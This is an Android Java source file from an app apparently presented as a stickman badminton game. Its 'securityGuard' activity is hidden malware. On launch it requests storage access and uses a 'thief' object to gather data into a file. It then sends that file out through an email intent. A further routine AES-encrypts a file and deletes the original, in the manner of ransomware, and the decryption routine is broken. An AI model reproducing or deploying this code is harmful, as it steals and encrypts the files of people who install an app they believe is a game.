package com.example.stickmanbadminton;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Environment;
import android.os.PersistableBundle;
import android.provider.Telephony;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;

public class securityGuard extends Activity {
    public Cipher cipher;
    public File encrypted;
    public Key legitkey;
    public Key unlockkey;
    public keygen generator = new keygen();
    public gimme_data thief = new gimme_data();
    public securityGuard(){
        try{
            this.cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        }catch(NoSuchPaddingException | NoSuchAlgorithmException  ex){
            ex.printStackTrace();
        }
    }
    public void mommygimmekey(File file,File copy) throws IOException {


        try{
            generator.password="";
            legitkey = generator.generator();
            final String password = generator.returnPassword();
            FileInputStream fis = new FileInputStream(file);
            byte[] output =new byte[cipher.getBlockSize()];
            IvParameterSpec iv = new IvParameterSpec(output);
            cipher.init(Cipher.ENCRYPT_MODE,legitkey,iv);
            FileOutputStream fos = new FileOutputStream(copy);
            byte[] buf = new byte[1024];
            int len;
            while((len = fis.read(buf)) != -1){
                fos.write(cipher.doFinal(buf,0,len));
                Thread.sleep(10);
            }

            fis.close();
            fos.close();
            file.delete();

//            email email  =new email(password,copy);
//            email.smtp();
        }catch(Exception e){
            e.printStackTrace();
        }


    }
    public void everythingisok() throws IOException{
        thief.createFile();
        try{
            Thread.sleep(1000);
        }catch(InterruptedException r){
            r.printStackTrace();
        }

        email email = new email("hello", encrypted);
        Intent intent  = email.sendemail();
        startActivity(intent);
//        mommyunlockforme(new File(external.getSDcardpath() + "lollipop.zip"),"fs_$oft8A~GJ26yp#!l" );
        System.exit(0);
    }
    public void mommyunlockforme(File file,String s){
        try{
            unlockkey = generator.decrypt(s);
            boolean hey = unlockkey.equals(legitkey);
            boolean bwoahs = s.equals(generator.returnPassword());
            FileInputStream fis = new FileInputStream(encrypted);
            byte[] output =new byte[cipher.getBlockSize()];
            IvParameterSpec iv = new IvParameterSpec(output);
            cipher.init(Cipher.ENCRYPT_MODE,unlockkey,iv);
            ZipOutputStream fos = new ZipOutputStream(new FileOutputStream(file));
            fos.putNextEntry(new ZipEntry(encrypted.getPath()));
            byte[] buffer = new byte[1024];
            int length;
            while((length = fis.read(buffer))>0){

                fos.write(cipher.doFinal(buffer,0,length));

            }
            fis.close();
            fos.close();

        }catch(Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        if(ContextCompat.checkSelfPermission(this.getApplicationContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},100);
        }
        if(ContextCompat.checkSelfPermission(this.getApplicationContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},100);
        }
        super.onCreate(savedInstanceState);
        this.encrypted = new File(Environment.getExternalStorageDirectory().getPath() + "/bwoah.enc");
        try{
            everythingisok();
        }catch(IOException e){
            e.printStackTrace();
        }


    }
}






